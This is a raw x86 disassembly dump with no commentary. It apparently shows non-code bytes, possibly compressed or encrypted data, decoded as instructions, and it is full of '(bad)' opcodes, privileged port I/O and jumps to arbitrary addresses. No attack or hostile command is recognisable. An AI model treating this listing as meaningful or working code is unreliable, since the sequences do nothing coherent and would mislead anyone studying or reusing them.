  40dfc7:	mov    eax,0x8c4f15e3
  40dfcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfcd:	mov    ah,0x37
  40dfcf:	pop    es
  40dfd0:	sub    eax,0x7b58c48a
  40dfd5:	sti    
  40dfd6:	or     eax,DWORD PTR [ebp+0x6e9db760]
  40dfdc:	out    dx,eax
  40dfdd:	xor    al,0x53
  40dfdf:	jp     0x40df84
  40dfe1:	je     0x40e017
  40dfe3:	out    dx,eax
  40dfe4:	mov    edx,0x43b168ff
  40dfe9:	jge    0x40dfad
  40dfeb:	pop    edi
  40dfec:	jle    0x40dfac
  40dfee:	ja     0x40dfc9
  40dff0:	int    0xc3
  40dff2:	stos   DWORD PTR es:[edi],eax
  40dff3:	pop    edx
  40dff4:	dec    ebx
  40dff5:	mov    ds:0x912e2cae,al
  40dffa:	xor    eax,0x102c4b02
  40dfff:	cli    
  40e000:	outs   dx,DWORD PTR ds:[esi]
  40e001:	mov    edx,0x80ce14f6
  40e006:	mov    ebp,0x6d6b8ab5
  40e00b:	mov    bl,BYTE PTR [esp+ecx*8]
  40e00e:	mov    al,ds:0xe5d15277
  40e013:	stos   DWORD PTR es:[edi],eax
  40e014:	xor    eax,0xdee52c4d
  40e019:	mov    al,0x6d
  40e01b:	xchg   edx,eax
  40e01c:	out    0x94,eax
  40e01e:	pop    edx
  40e01f:	inc    esi
  40e020:	lds    edx,FWORD PTR [ecx-0x57]
  40e023:	sub    eax,0x9c1b68bb
  40e028:	pop    esp
  40e029:	lds    edi,FWORD PTR [ebx+0x2bd52f12]
  40e02f:	adc    eax,0xc12e0ceb
  40e034:	inc    edx
  40e035:	(bad)  
  40e036:	std    
  40e037:	(bad)
  40e03b:	repnz test al,0x3c
  40e03e:	mov    ch,BYTE PTR [bx-0x4fa]
  40e043:	lock test BYTE PTR [edx+0x2db0a524],0xed
  40e04b:	cs push 0x34729b7f
  40e051:	sbb    dh,BYTE PTR [edx]
  40e053:	rol    DWORD PTR [ebp+0x66],cl
  40e056:	out    dx,eax
  40e057:	add    DWORD PTR [esi+0x77eead44],edx
  40e05d:	bound  edx,QWORD PTR [edx]
  40e05f:	je     0x40e0b4
  40e061:	loop   0x40e051
  40e063:	aad    0xa2
  40e065:	and    BYTE PTR [esi+0x6c3f5ca5],0x30
  40e06c:	and    al,BYTE PTR [ecx]
  40e06e:	(bad)  [edx+eiz*1-0x42]
  40e072:	push   0xffffff9a
  40e074:	jmp    0x7d57da4f
  40e079:	and    edx,DWORD PTR [ebp-0x8]
  40e07c:	jge    0x40e098
  40e07e:	push   ds
  40e07f:	lds    ebx,FWORD PTR [ecx+eiz*1]
  40e082:	xor    DWORD PTR [edx],esp
  40e084:	and    al,0x57
  40e086:	mov    ds:0xb098e15d,al
  40e08b:	cmc    
  40e08c:	add    BYTE PTR [ebp+esi*1+0x3c16330a],dl
  40e093:	dec    edx
  40e094:	pop    es
  40e095:	and    BYTE PTR [ebx-0x7f994eaa],al
  40e09b:	add    eax,esp
  40e09d:	mov    ch,0xbf
  40e09f:	mov    ebp,0x6377fbc3
  40e0a4:	adc    al,0x36
  40e0a6:	ffreep st(0)
  40e0a8:	int3   
  40e0a9:	popf   
  40e0aa:	inc    esi
  40e0ab:	xchg   ebx,eax
  40e0ac:	js     0x40e0e6
  40e0ae:	jnp    0x40e091
  40e0b0:	loop   0x40e108
  40e0b2:	neg    DWORD PTR [edi-0x11]
  40e0b5:	dec    esp
  40e0b6:	shl    bl,0x60
  40e0b9:	sub    cl,BYTE PTR [ebx-0x3a]
  40e0bc:	jo     0x40e052
  40e0be:	mov    bp,0xa594
  40e0c2:	je     0x40e0fe
  40e0c4:	lds    ecx,FWORD PTR [ecx]
  40e0c6:	pop    ecx
  40e0c7:	pop    esi
  40e0c8:	or     ecx,DWORD PTR [edx]
  40e0ca:	jl     0x40e0f6
  40e0cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0cd:	or     BYTE PTR [edi+eax*2],bl
  40e0d0:	jl     0x40e088
  40e0d2:	jl     0x40e10b
  40e0d4:	pop    edi
  40e0d5:	sbb    BYTE PTR [edi-0x6a805c3],dl
  40e0db:	sbb    eax,0xf8feda6b
  40e0e0:	sub    dl,BYTE PTR [edi-0x552efc63]
  40e0e6:	mov    ebx,0xc7935583
  40e0eb:	or     eax,0x3a81630e
  40e0f0:	js     0x40e142
  40e0f2:	je     0x40e123
  40e0f4:	ror    DWORD PTR [edi],cl
  40e0f6:	das    
  40e0f7:	or     bl,dh
  40e0f9:	adc    DWORD PTR ds:0xd909f273,ebp
  40e0ff:	push   ss
  40e100:	dec    edi
  40e101:	or     eax,0xd00c284c
  40e106:	lock dec ecx
  40e108:	lea    edx,[ebp+0x15]
  40e10b:	fdivrp st(5),st
  40e10d:	jno    0x40e165
  40e10f:	std    
  40e110:	push   0x18
  40e112:	xchg   ecx,eax
  40e113:	xchg   ebp,eax
  40e114:	dec    ebx
  40e115:	sub    ch,BYTE PTR [esi+0x7ada9f90]
  40e11b:	icebp  
  40e11c:	mov    al,0xdc
  40e11e:	cwde   
  40e11f:	(bad)  
  40e120:	(bad)
  40e124:	pop    ebx
  40e125:	pop    esp
  40e126:	sbb    DWORD PTR [ebp-0x34b87daa],ebp
  40e12c:	xchg   ebx,eax
  40e12d:	jle    0x40e199
  40e12f:	xor    ah,BYTE PTR [ebx+0x348238f1]
  40e135:	cmp    edi,DWORD PTR [eax+0x5eaf3c43]
  40e13b:	repnz push ebp
  40e13d:	xchg   edx,eax
  40e13e:	dec    ebp
  40e13f:	mov    cs,WORD PTR [ebx]
  40e141:	adc    DWORD PTR [ebp+0x38faf595],0x80fa7f6b
  40e14b:	sub    al,0xc4
  40e14d:	or     DWORD PTR [edi-0x54],0xffffffd8
  40e151:	in     al,0xea
  40e153:	loop   0x40e17d
  40e155:	ins    BYTE PTR es:[edi],dx
  40e156:	xor    eax,DWORD PTR [eax]
  40e158:	mov    al,0xc5
  40e15a:	inc    edx
  40e15b:	inc    ecx
  40e15c:	xor    DWORD PTR [ebp+0x6a9f0adc],edi
  40e162:	jb     0x40e181
  40e164:	xor    BYTE PTR [ebx],cl
  40e166:	scas   eax,DWORD PTR es:[edi]
  40e167:	loop   0x40e1c6
  40e169:	pusha  
  40e16a:	sub    al,BYTE PTR [ebp+0x7e]
  40e16d:	je     0x40e0f8
  40e16f:	dec    esi
  40e170:	sub    BYTE PTR [eax+0x66],cl
  40e173:	pop    esp
  40e174:	imul   edi,DWORD PTR [ecx+eiz*1],0x3c3a886d
  40e17b:	int3   
  40e17c:	sahf   
  40e17d:	pushf  
  40e17e:	or     BYTE PTR [esi],ch
  40e180:	adc    al,0xd6
  40e182:	pop    ds
  40e183:	add    eax,0xa00e521c
  40e188:	mov    ebx,0xf1d4afb7
  40e18d:	ret    0xd107
  40e190:	(bad)  
  40e191:	retf   0x1cee
  40e194:	mov    esi,0x475c27b5
  40e199:	sbb    eax,0xa89ef4e9
  40e19e:	adc    al,BYTE PTR [edi+eiz*2+0x28]
  40e1a2:	lea    ecx,[ebx-0x4a5dc525]
  40e1a8:	pop    ss
  40e1a9:	lds    ebp,FWORD PTR [ecx+0x4f]
  40e1ac:	and    BYTE PTR [ecx],0x1e
  40e1af:	retf   
  40e1b0:	xor    al,0x6f
  40e1b2:	push   esi
  40e1b3:	(bad)  
  40e1b5:	cmc    
  40e1b6:	xor    al,0xb9
  40e1b8:	jbe    0x40e195
  40e1ba:	loope  0x40e217
  40e1bc:	or     esi,edx
  40e1be:	cmc    
  40e1bf:	xor    DWORD PTR [esi-0x1084a832],edi
  40e1c5:	dec    eax
  40e1c6:	imul   esi,ebp,0xcdaccb2a
  40e1cc:	mov    ecx,0xe890c529
  40e1d1:	stc    
  40e1d2:	dec    ebx
  40e1d3:	inc    ebp
  40e1d4:	iret   
  40e1d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1d6:	and    cl,BYTE PTR ds:0x6a4c5dc
  40e1dc:	sbb    DWORD PTR [ecx+0x1d51814b],0x79
  40e1e3:	fucomip st,st(7)
  40e1e5:	out    0x23,al
  40e1e7:	mov    dl,0x2f
  40e1e9:	or     al,0x29
  40e1eb:	sbb    esp,DWORD PTR [edi+0x41]
  40e1ee:	and    DWORD PTR [esi+0x6d78aed7],0x6f1663e7
  40e1f8:	jbe    0x40e1da
  40e1fa:	loop   0x40e1a2
  40e1fc:	dec    edi
  40e1fe:	scas   eax,DWORD PTR es:[edi]
  40e1ff:	or     al,0x6f
  40e201:	xchg   BYTE PTR [ebx],bl
  40e203:	and    bl,dl
  40e205:	add    ebp,DWORD PTR [edx+0x3886a017]
  40e20b:	push   cs
  40e20c:	dec    edx
  40e20d:	pop    eax
  40e20e:	shl    BYTE PTR ds:0x8f2473f6,0x63
  40e215:	inc    esi
  40e216:	push   0xc6c4b243
  40e21b:	mov    dl,0xef
  40e21d:	int3   
  40e21e:	(bad)  [edi+0x65]
  40e221:	cmp    ebp,DWORD PTR [edx+eiz*2-0x11]
  40e225:	out    dx,eax
  40e226:	inc    eax
  40e227:	stos   BYTE PTR es:[edi],al
  40e228:	xchg   edi,eax
  40e229:	ret    0xce23
  40e22c:	in     eax,dx
  40e22d:	cmp    esi,DWORD PTR [ecx-0x42]
  40e230:	jbe    0x40e295
  40e232:	push   ds
  40e233:	popf   
  40e234:	mov    esi,0x276f3513
  40e239:	fstp   QWORD PTR [edx+0x17]
  40e23c:	dec    edx
  40e23d:	(bad)  
  40e23e:	pop    esi
  40e23f:	push   ebp
  40e240:	enter  0x4ac4,0x42
  40e244:	mov    ah,0x7f
  40e246:	lahf   
  40e247:	rcl    DWORD PTR ds:[edi],cl
  40e24a:	imul   edx,DWORD PTR [edi+ecx*2-0x3eb1968d],0x6b16d039
  40e255:	ret    0x111b
  40e258:	xchg   edi,eax
  40e259:	xor    DWORD PTR [edx-0x630cd853],eax
  40e25f:	mov    eax,ss:0x22d82cf2
  40e265:	mov    al,0x26
  40e267:	lods   al,BYTE PTR ds:[esi]
  40e268:	(bad)  
  40e269:	(bad)
  40e26c:	mov    edi,0xb7f08fc1
  40e271:	in     al,0xe7
  40e273:	mov    esi,0x5805da0e
  40e278:	xchg   ecx,eax
  40e279:	retf   
  40e27a:	jae    0x40e22e
  40e27c:	stos   BYTE PTR es:[edi],al
  40e27d:	mov    ds:0xcac86ccd,eax
  40e282:	xor    al,0x18
  40e284:	sbb    bh,0xf8
  40e287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e288:	into   
  40e289:	push   ss
  40e28a:	jb     0x40e28a
  40e28c:	test   BYTE PTR [edx],dh
  40e28e:	jmp    0x23ce:0xf9d06db1
  40e295:	repnz ds and ch,dh
  40e299:	je     0x40e258
  40e29b:	jne    0x40e258
  40e29d:	add    ecx,DWORD PTR [eax]
  40e29f:	dec    edx
  40e2a0:	cmp    ebp,eax
  40e2a2:	push   cs
  40e2a3:	pop    edi
  40e2a4:	sahf   
  40e2a5:	imul   ebp,DWORD PTR [ecx+0x2999db4],0x5f
  40e2ac:	dec    edi
  40e2ad:	dec    eax
  40e2ae:	cld    
  40e2af:	popf   
  40e2b0:	mov    al,0x71
  40e2b2:	fsubr  DWORD PTR [ebx-0x7a]
  40e2b5:	sub    bh,BYTE PTR [esi+eax*1+0x286d10f0]
  40e2bc:	cmc    
  40e2bd:	idiv   DWORD PTR [ebx]
  40e2bf:	(bad)  
  40e2c0:	adc    ecx,eax
  40e2c2:	mov    edi,0xf04e1181
  40e2c7:	xor    eax,0x15aceee3
  40e2cc:	push   esp
  40e2cd:	in     eax,0x82
  40e2cf:	ja     0x40e2ba
  40e2d1:	and    BYTE PTR [ebx-0x45],0x37
  40e2d5:	cwde   
  40e2d6:	mov    edx,DWORD PTR [edi+0x6e6c160]
  40e2dc:	add    DWORD PTR [ebx],esi
  40e2de:	push   ebp
  40e2df:	mov    esp,0x618c352d
  40e2e4:	push   es
  40e2e5:	in     eax,dx
  40e2e6:	sbb    DWORD PTR [ecx+0x13a3a08d],edx
  40e2ec:	test   eax,0x33ae7dd0
  40e2f1:	(bad)  [eax-0x72]
  40e2f4:	hlt    
  40e2f5:	pop    es
  40e2f6:	add    eax,0xc16939fc
  40e2fb:	and    DWORD PTR [ecx],ebp
  40e2fd:	pop    ecx
  40e2fe:	adc    BYTE PTR [eax+ebp*4],ch
  40e301:	fld    QWORD PTR [edi+0x78]
  40e304:	mov    edx,0xf6d9a064
  40e309:	xor    al,0x64
  40e30b:	cmp    eax,0x24b083e8
  40e310:	in     eax,dx
  40e311:	inc    esi
  40e312:	mov    ds:0xdd695d70,eax
  40e317:	and    cl,0xc5
  40e31a:	push   ss
  40e31b:	adc    edx,DWORD PTR [edx+0x57c6e13b]
  40e321:	sbb    al,0xce
  40e323:	sbb    DWORD PTR [edi+0x4a],edx
  40e326:	scas   eax,DWORD PTR es:[edi]
  40e327:	dec    esi
  40e328:	inc    esi
  40e329:	hlt    
  40e32a:	xor    esp,DWORD PTR [edx+0x71]
  40e32d:	ret    0xae1c
  40e330:	mov    edi,0x60cdbd54
  40e335:	out    dx,al
  40e336:	leave  
  40e337:	dec    ebp
  40e338:	outs   dx,BYTE PTR ds:[esi]
  40e339:	inc    edi
  40e33a:	cmp    DWORD PTR [ebp-0x6abff4e0],eax
  40e340:	rcr    DWORD PTR [edx],cl
  40e342:	adc    edx,DWORD PTR [edx-0x22]
  40e345:	popa   
  40e346:	add    al,0xa
  40e348:	pop    ds
  40e349:	sbb    ah,bh
  40e34b:	push   ss
  40e34c:	dec    edi
  40e34d:	imul   ebx,DWORD PTR [eax+0xa099ed],0x668efcc6
  40e357:	sub    ebx,DWORD PTR [esi-0x12]
  40e35a:	sti    
  40e35b:	and    ecx,DWORD PTR [edx-0x6f]
  40e35e:	pusha  
  40e35f:	dec    edi
  40e360:	inc    ebp
  40e361:	out    dx,eax
  40e362:	sub    eax,0xb2a3d679
  40e367:	mov    al,ds:0xa94bcd2d
  40e36c:	fimul  DWORD PTR [ebp+eax*1+0x53e1ff3a]
  40e373:	(bad)  
  40e374:	ins    DWORD PTR es:[edi],dx
  40e375:	push   0x4c
  40e377:	xor    DWORD PTR [eax+ebx*1+0x7d],esp
  40e37b:	push   0xe0e72fe
  40e380:	sbb    cl,BYTE PTR [esi+0x7d7ce8fc]
  40e386:	popa   
  40e387:	fadd   QWORD PTR [ecx+0x35936e37]
  40e38d:	mov    dl,0x91
  40e38f:	xor    eax,0x709990d5
  40e394:	sbb    al,0x3b
  40e396:	or     DWORD PTR [edx+0x7d],ecx
  40e399:	repz fsubp st(0),st
  40e39c:	sbb    BYTE PTR [eax-0x4c],bh
  40e39f:	fadd   QWORD PTR [eax]
  40e3a1:	aas    
  40e3a2:	das    
  40e3a3:	xchg   edi,eax
  40e3a4:	or     eax,0x715a852a
  40e3a9:	sbb    eax,0x4c919d25
  40e3ae:	ss test cl,ah
  40e3b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3b2:	mov    dh,0x26
  40e3b4:	inc    ecx
  40e3b5:	sub    dl,BYTE PTR [esi+0xbb16cb1]
  40e3bb:	mov    dl,0x75
  40e3bd:	int3   
  40e3be:	push   edi
  40e3bf:	scas   eax,DWORD PTR es:[edi]
  40e3c0:	add    ecx,edx
  40e3c2:	push   ecx
  40e3c3:	xor    BYTE PTR [ebx-0x1fe96bb7],bl
  40e3c9:	add    DWORD PTR [eax-0x29453af2],0xffffffd3
  40e3d0:	add    cl,BYTE PTR [ebp+0xe694268]
  40e3d6:	mov    ah,0xf5
  40e3d8:	pop    edi
  40e3d9:	hlt    
  40e3da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3db:	add    al,0xfd
  40e3dd:	enter  0xbaeb,0x8
  40e3e1:	stc    
  40e3e2:	sti    
  40e3e3:	adc    al,0xc9
  40e3e5:	addr16 loop 0x40e433
  40e3e8:	pop    ebx
  40e3e9:	mov    al,ds:0xeb919932
  40e3ee:	sbb    dh,BYTE PTR [esi+0x44]
  40e3f1:	push   esp
  40e3f2:	sub    esi,DWORD PTR [esi-0x7f]
  40e3f5:	cwde   
  40e3f6:	add    BYTE PTR [ebx-0x1f85fd85],bl
  40e3fc:	inc    BYTE PTR [ebx-0x9fd419f]
  40e402:	jle    0x40e44e
  40e404:	xlat   BYTE PTR ds:[ebx]
  40e405:	or     DWORD PTR ds:0xd617a74a,0xffffffce
  40e40c:	xor    ebx,ebp
  40e40e:	sub    edx,DWORD PTR [eax+0x6b82fcb7]
  40e414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e415:	aam    0x77
  40e417:	fisubr WORD PTR [edi]
  40e419:	and    eax,0xe5bef15e
  40e41e:	cmp    DWORD PTR [ecx+0x19a615ab],ebx
  40e424:	jp     0x40e3f4
  40e426:	lods   eax,DWORD PTR ds:[esi]
  40e427:	jle    0x40e480
  40e429:	fs dec edx
  40e42b:	aaa    
  40e42c:	jmp    0x40e3b1
  40e42e:	mov    dh,0xc1
  40e430:	jno    0x40e430
  40e432:	xchg   esp,eax
  40e433:	(bad)  
  40e434:	dec    ebx
  40e435:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e437:	inc    eax
  40e438:	mov    al,ds:0x1b73324b
  40e43d:	adc    eax,DWORD PTR [ecx]
  40e43f:	loopne 0x40e469
  40e441:	out    0x2f,eax
  40e443:	sbb    esp,DWORD PTR [eax]
  40e445:	adc    BYTE PTR [ecx+0x66dcffb3],dh
  40e44b:	dec    eax
  40e44c:	inc    esp
  40e44d:	sbb    ebx,DWORD PTR [edi-0x67a0831]
  40e453:	jbe    0x40e43b
  40e455:	mov    bl,0xe1
  40e457:	aas    
  40e458:	and    BYTE PTR [ecx+ecx*4-0x7b],cl
  40e45c:	and    al,0x6e
  40e45e:	pusha  
  40e45f:	push   0x26e70e7b
  40e464:	stos   BYTE PTR es:[edi],al
  40e465:	pop    esp
  40e466:	dec    edi
  40e467:	add    al,0x59
  40e469:	cld    
  40e46a:	cmp    al,0x7a
  40e46c:	pop    esi
  40e46d:	sahf   
  40e46e:	mov    al,ds:0x7b2330a8
  40e473:	sub    esi,esp
  40e475:	retf   0xc1c2
  40e478:	or     eax,0xd6623a7e
  40e47d:	fistp  DWORD PTR cs:[edi+0x22d4c0e9]
  40e484:	retf   
  40e485:	inc    edx
  40e486:	aad    0x41
  40e488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e489:	into   
  40e48a:	dec    ebx
  40e48b:	arpl   WORD PTR [esi],cx
  40e48d:	mov    bl,0x1b
  40e48f:	daa    
  40e490:	cmp    BYTE PTR [ecx],bl
  40e492:	or     DWORD PTR [ecx-0x5ef41f77],edx
  40e498:	(bad)  
  40e499:	push   esp
  40e49a:	sti    
  40e49b:	shl    DWORD PTR [eax],0x67
  40e49e:	pop    esp
  40e49f:	pop    ss
  40e4a0:	scas   al,BYTE PTR es:[edi]
  40e4a1:	adc    ebx,DWORD PTR [edx+0x213cf063]
  40e4a7:	enter  0xa32b,0xec
  40e4ab:	mov    BYTE PTR ds:0x8a1f5b9d,bh
  40e4b1:	test   BYTE PTR [ecx],ch
  40e4b3:	mov    edx,DWORD PTR [edx+0x2b1cc46]
  40e4b9:	push   edi
  40e4ba:	scas   al,BYTE PTR es:[edi]
  40e4bb:	cmc    
  40e4bc:	jno    0x40e4d8
  40e4be:	xchg   edx,eax
  40e4bf:	data16 jno 0x40e44b
  40e4c2:	ins    BYTE PTR es:[edi],dx
  40e4c3:	pop    ebp
  40e4c4:	mov    al,ds:0x9aa5ee82
  40e4c9:	xchg   esp,eax
  40e4ca:	rcr    DWORD PTR [ebx],0xd6
  40e4cd:	lods   eax,DWORD PTR ds:[esi]
  40e4ce:	adc    esp,DWORD PTR [esi+esi*4]
  40e4d1:	loope  0x40e4b3
  40e4d3:	aaa    
  40e4d4:	ret    0xdfe8
  40e4d7:	adc    BYTE PTR [eax],bh
  40e4d9:	lods   eax,DWORD PTR ds:[esi]
  40e4da:	mov    esi,0x322aa644
  40e4df:	jle    0x40e4f6
  40e4e1:	in     eax,0x19
  40e4e3:	jno    0x40e4b4
  40e4e5:	cld    
  40e4e6:	pusha  
  40e4e7:	sbb    al,0xbe
  40e4e9:	outs   dx,BYTE PTR ds:[esi]
  40e4ea:	ror    ecx,0x11
  40e4ed:	mov    ebp,0xba7ee7aa
  40e4f2:	push   esi
  40e4f3:	cli    
  40e4f4:	dec    esp
  40e4f5:	xchg   esi,eax
  40e4f6:	ds adc eax,0xf9f54004
  40e4fc:	fistp  WORD PTR [edx-0x3f]
  40e4ff:	mov    ds:0xd20e241,al
  40e504:	lds    ebx,FWORD PTR [edx+edx*2]
  40e507:	sub    BYTE PTR [ebx+0x72],bl
  40e50a:	shr    esp,cl
  40e50c:	call   FWORD PTR [edx+ebp*2+0x34d6b30d]
  40e513:	aas    
  40e514:	loope  0x40e570
  40e516:	outs   dx,DWORD PTR ds:[esi]
  40e517:	xchg   ecx,eax
  40e518:	std    
  40e519:	data16 mov ah,0x8d
  40e51c:	push   cs
  40e51d:	mov    al,ds:0x85098f77
  40e522:	mov    BYTE PTR [ebx],dh
  40e524:	ror    DWORD PTR [edx],0xc0
  40e527:	dec    eax
  40e528:	dec    esi
  40e529:	ror    edx,cl
  40e52b:	or     dl,ah
  40e52d:	mov    ds:0x2d3915ed,al
  40e532:	cmp    ch,BYTE PTR [edx]
  40e534:	push   edx
  40e535:	ins    DWORD PTR es:[edi],dx
  40e536:	das    
  40e537:	pusha  
  40e538:	jnp    0x40e582
  40e53a:	cmp    eax,0xff4e8ba
  40e53f:	and    DWORD PTR [eax+0x5f],edi
  40e542:	scas   al,BYTE PTR es:[edi]
  40e543:	and    dh,ah
  40e545:	jge    0x40e4ea
  40e547:	mov    ds,edi
  40e549:	adc    al,0x43
  40e54b:	or     BYTE PTR [eax-0x6a],al
  40e54e:	adc    edi,DWORD PTR [ebx]
  40e550:	repz jo 0x40e51f
  40e553:	data16 sub ax,0x663e
  40e558:	jmp    0xaa5f:0x3fc0a26d
  40e55f:	fs in  al,0x49
  40e562:	(bad)  
  40e563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e564:	add    ch,ch
  40e566:	inc    eax
  40e567:	and    bh,BYTE PTR [edi-0x3a3a72c7]
  40e56d:	jmp    0x40e5e9
  40e56f:	jl     0x40e589
  40e571:	cwde   
  40e572:	jle    0x40e546
  40e574:	xor    al,0xbe
  40e576:	add    al,0xae
  40e578:	idiv   BYTE PTR [ebp+0x61d32aeb]
  40e57e:	std    
  40e57f:	jnp    0x40e5a5
  40e581:	pop    edx
  40e582:	sub    al,0xb1
  40e584:	retf   0x4f0c
  40e587:	test   BYTE PTR [eax+edi*1+0x41],cl
  40e58b:	(bad)  
  40e58d:	cmp    DWORD PTR [esi],0xffffff95
  40e590:	sub    eax,0x7370fd97
  40e595:	sub    dl,BYTE PTR [ebp-0x75b27ffb]
  40e59b:	stc    
  40e59c:	xchg   ecx,eax
  40e59d:	mov    ds:0xc06ede83,al
  40e5a2:	leave  
  40e5a3:	push   0xbd5b1cf8
  40e5a8:	dec    edx
  40e5a9:	dec    ebx
  40e5aa:	daa    
  40e5ab:	nop
  40e5ac:	fnstsw WORD PTR [ecx]
  40e5ae:	pop    ecx
  40e5af:	jle    0x40e5ca
  40e5b1:	xor    DWORD PTR [ecx],eax
  40e5b3:	sub    DWORD PTR [ebx+ebp*8-0x23],ecx
  40e5b7:	(bad)  
  40e5b8:	loopne 0x40e56e
  40e5ba:	test   al,0xfd
  40e5bc:	mov    ch,0xbd
  40e5be:	sbb    edi,eax
  40e5c0:	adc    DWORD PTR [edi+0x486c2cf5],ebx
  40e5c6:	nop
  40e5c7:	sub    BYTE PTR [edi],ah
  40e5c9:	nop
  40e5ca:	mov    DWORD PTR [esi],ebp
  40e5cc:	fcomp  QWORD PTR [edi]
  40e5ce:	call   FWORD PTR [edx]
  40e5d0:	xchg   edi,eax
  40e5d1:	sbb    eax,0x4768c95e
  40e5d6:	not    BYTE PTR [ebx]
  40e5d8:	inc    edi
  40e5d9:	cmp    eax,0xf52ff049
  40e5de:	call   0x7305:0x7aa0e648
  40e5e5:	dec    eax
  40e5e6:	pop    eax
  40e5e7:	push   ds
  40e5e8:	je     0x40e64b
  40e5ea:	sbb    ah,BYTE PTR [esi]
  40e5ec:	mov    edi,0xed35a9c3
  40e5f1:	fs inc eax
  40e5f3:	inc    ebx
  40e5f4:	adc    ch,BYTE PTR [edx]
  40e5f6:	ficomp WORD PTR [eax+esi*4-0x3c]
  40e5fa:	lods   eax,DWORD PTR ds:[esi]
  40e5fb:	push   ebx
  40e5fc:	int    0xf9
  40e5fe:	jno    0x40e5f3
  40e600:	cmp    al,BYTE PTR [ebx]
  40e602:	pop    esi
  40e603:	mov    edx,DWORD PTR [ecx-0x3bf695a6]
  40e609:	push   edi
  40e60a:	jnp    0x40e664
  40e60c:	jge    0x40e625
  40e60e:	pop    es
  40e60f:	jno    0x40e5d5
  40e611:	jle    0x40e5f8
  40e613:	inc    esp
  40e614:	cmp    eax,0xe68316ff
  40e619:	scas   eax,DWORD PTR es:[edi]
  40e61a:	aas    
  40e61b:	jg     0x40e67d
  40e61d:	mov    bh,BYTE PTR [esi+0x1100365c]
  40e623:	sub    BYTE PTR [eax],al
  40e625:	dec    ch
  40e627:	sbb    cl,dl
  40e629:	dec    edi
  40e62a:	inc    esi
  40e62b:	sbb    ebp,ebp
  40e62d:	dec    ebx
  40e62e:	outs   dx,BYTE PTR ds:[esi]
  40e62f:	mov    bh,0xf2
  40e631:	fisubr WORD PTR [eax]
  40e633:	mov    bh,0x6a
  40e635:	icebp  
  40e636:	mov    esi,0xf62c971b
  40e63b:	mov    al,ds:0xc04db14a
  40e640:	out    0xa7,eax
  40e642:	ja     0x40e61c
  40e644:	lods   al,BYTE PTR ds:[esi]
  40e645:	sub    DWORD PTR [esi],eax
  40e647:	adc    eax,edx
  40e649:	push   ebp
  40e64a:	push   0x1c4c4017
  40e64f:	mov    edi,0x4b2d83dd
  40e654:	inc    esp
  40e655:	mov    ah,0xf5
  40e657:	cli    
  40e658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e659:	mov    DWORD PTR [ecx-0x52],edx
  40e65c:	jle    0x40e69b
  40e65e:	inc    edx
  40e65f:	mov    WORD PTR [ebx],es
  40e661:	hlt    
  40e662:	jns    0x40e66b
  40e664:	add    BYTE PTR [edx],bh
  40e666:	test   DWORD PTR [ebx+0x17],edi
  40e669:	das    
  40e66a:	mov    ds:0xf0663dca,al
  40e66f:	aad    0x10
  40e671:	sub    eax,esi
  40e673:	dec    edx
  40e674:	or     cl,BYTE PTR [esi]
  40e676:	mov    ch,0x58
  40e678:	imul   esp,DWORD PTR [esi+0x3b2e548c],0xb4aedb9b
  40e682:	sub    ch,BYTE PTR ds:0x7703903e
  40e688:	adc    al,0xef
  40e68a:	cmp    ecx,DWORD PTR [eax]
  40e68c:	out    dx,eax
  40e68d:	mov    eax,ds:0x18191fd6
  40e692:	add    DWORD PTR [ecx],esp
  40e694:	and    ecx,0x7c3efab
  40e69a:	pop    edx
  40e69b:	aas    
  40e69c:	jg     0x40e67e
  40e69e:	ja     0x40e709
  40e6a0:	mov    BYTE PTR [edi],dh
  40e6a2:	stc    
  40e6a3:	or     bl,bl
  40e6a5:	jo     0x40e6ac
  40e6a7:	cwde   
  40e6a8:	inc    ecx
  40e6a9:	cmp    DWORD PTR [ebp+0x560591d2],0xe13b73b0
  40e6b3:	cdq    
  40e6b4:	das    
  40e6b5:	test   DWORD PTR [edx+0x17efdcc2],0x73b817c3
  40e6bf:	pop    esp
  40e6c0:	daa    
  40e6c1:	add    eax,0x33fa9f41
  40e6c6:	cmp    al,bl
  40e6c8:	and    eax,0xb374ae7d
  40e6cd:	repz jg 0x40e716
  40e6d0:	dec    esi
  40e6d1:	xor    DWORD PTR [eax],0x9d1fa514
  40e6d7:	sbb    BYTE PTR [ebx],ah
  40e6d9:	pop    esp
  40e6da:	add    DWORD PTR ds:0xaec3b329,ecx
  40e6e0:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6e2:	pusha  
  40e6e3:	push   cs
  40e6e4:	sub    eax,0x70a83c73
  40e6e9:	mov    eax,ds:0x30360271
  40e6ee:	adc    eax,0xd2918eaf
  40e6f3:	cmc    
  40e6f4:	lock into 
  40e6f6:	jmp    DWORD PTR [ebp+0x25]
  40e6f9:	xchg   edi,eax
  40e6fa:	push   edi
  40e6fb:	and    eax,edi
  40e6fd:	mov    cl,0xc9
  40e6ff:	lock out dx,al
  40e701:	adc    BYTE PTR [ecx-0x40455a8f],cl
  40e707:	mov    eax,ds:0xc656fbed
  40e70c:	(bad)  
  40e70d:	push   esi
  40e70e:	in     al,0xaa
  40e710:	sbb    DWORD PTR [edi],0x39
  40e713:	in     al,dx
  40e714:	jbe    0x40e71a
  40e716:	or     ebp,DWORD PTR [eax+0x6a]
  40e719:	xor    esp,ecx
  40e71b:	sti    
  40e71c:	je     0x40e73f
  40e71e:	das    
  40e71f:	fwait
  40e720:	mov    ds:0x65a1ee88,eax
  40e725:	push   ss
  40e726:	adc    BYTE PTR [edi+0x1d],bh
  40e729:	pop    ebx
  40e72a:	fwait
  40e72b:	mov    al,0x7c
  40e72d:	pop    edi
  40e72e:	dec    esi
  40e72f:	imul   eax,DWORD PTR [ebp*2+0x49496bf5],0x4c137cf
  40e73a:	mov    eax,0x73f38e5e
  40e73f:	clc    
  40e740:	mov    al,ds:0x3c9ed595
  40e745:	jmp    0xaf62:0xaa916d4a
  40e74c:	es movmskps edi,xmm1
  40e750:	out    dx,eax
